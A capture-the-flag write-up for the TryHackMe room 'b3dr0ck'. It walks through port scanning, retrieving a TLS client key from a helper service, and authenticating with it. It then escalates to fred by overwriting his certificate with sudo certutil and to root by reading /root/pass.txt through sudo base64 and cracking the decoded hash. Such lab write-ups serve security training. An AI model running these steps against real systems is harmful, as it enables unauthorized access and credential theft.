```bash
# PLATFORM          . THM
# CTF NAME          . b3dr0ck
# DESCRIPTION       . Server trouble in Bedrock.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/b3dr0ck
```

```
Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. 
Here's what we know...

    He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
    There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
    There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
```

___

```
sudo nmap -sSVC -T5 -p- 10.10.39.99 -oN bedrock
```

```
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1ac70071b665f582d824807248ad996e (RSA)
|   256 3ab5252eea2b44582455ef82cee0baeb (ECDSA)
|_  256 cf10028e96d324adae7dd15a0dc486ac (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.39.99:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)

4040/tcp  open  ssl/yo-main?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Thu, 15 Feb 2024 20:57:10 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|     Need to try and secure
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Thu, 15 Feb 2024 20:57:11 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2024-02-15T20:53:46
|_Not valid after:  2025-02-14T20:53:46
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?

54321/tcp open  ssl/unknown
| fingerprint-strings: 
|   NULL, RTSPRequest, SMBProgNeg, TerminalServer, WMSRequest, X11Probe: 
|_    Error: 'undefined' is not authorized for access.
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2024-02-15T20:53:46
|_Not valid after:  2025-02-14T20:53:46
|_ssl-date: TLS randomness does not represent time
```

#### PORT 80

```
Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...
```

- Anyway, considering the information known before starting the CTF, I skipped looking further into port 80 for now.

#### PORT 4040

- Port 80 is redirecting here if we accept the 'security risks'.

#### PORT 9009

- I've decided to use `nc` to connect to this service to see what it is about.

```
nc 10.10.39.99 9009
```

- I tried `cert` as an answer to the `What are you looking for?` and it seems it worked. The same goes for `key`.

```
 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|

What are you looking for? cert
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
{REDACTED}
-----END CERTIFICATE-----

What are you looking for? key 
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
{REDACTED}
-----END RSA PRIVATE KEY-----

```

#### PORT 54321

- Since this is running over SSL, we must connect using `openssl` instead of `nc`.

```
openssl s_client -connect 10.10.39.99:54321 -cert cert_file -key key_file
```

```
Welcome: 'Barney Rubble' is authorized.
b3dr0ck> whoami
Current user = 'Barney Rubble' (valid peer certificate)
b3dr0ck> 
```

- I tried running `ls`, but I got some hints.

```
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> help
Password hint: d1{REDACTED}80dd (user = 'Barney Rubble')
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> 
```

- The password hint looked like a MD5 hash, but crackstation couldn't crack it. 

- Before I tried using john on it, I've decided to try SSH'ing as `barney` and using the hint as password.

- It worked. The string was not a hash, but the actual password.

- The first flag is in `/home/barney/barney.txt`.

#### PRIVESC --- barney -> fred

```
User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```

- It has only two options available, to list current certificates and to create a new one.

- By listing the current certificates, we see that the user fred also got a pair, but we can't read them.

- However, I found out that if we create another pair with the same name, they'll get overriden.

```
sudo certutil fred fred
```

- Then, I've copied the cert and the key to my local box and I've authenticated against port `54321` the same way

```
openssl s_client -connect 10.10.39.99:54321 -cert fredcert -key fredkey 
```

```
Welcome: 'fred' is authorized.
b3dr0ck> hint
Password hint: {REDACTED}! (user = 'fred')
```

#### PRIVESC --- fred -> root

- Fred's flag is in `/home/fred/fred.txt`.

```
User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

- I decided to use `base64 -d` to read the file.

```
Sorry, user fred is not allowed to execute '/usr/bin/base64 -d /root/pass.txt' as root on b3dr0ck.
```

- Okay, but we could read the base64-encoded `pass.txt` 

```
sudo /usr/bin/base64 /root/pass.txt
TEZ{REDACTED}WVTJSQ1dO
```

- This is in turn encoded with base32.

- After decoding the base32 string, we get another one encoded with base64.

- After decoding the second base64 string, we're getting an MD5 hash that can be cracked easily using crackstation.

```
a00a12{REDACTED}05a31d56
```

- This is the `root`'s password.

```
su root
Password: 
root@b3dr0ck:/usr/share/abc/certs# 
```

- The last flag is in `/root/root.txt`.

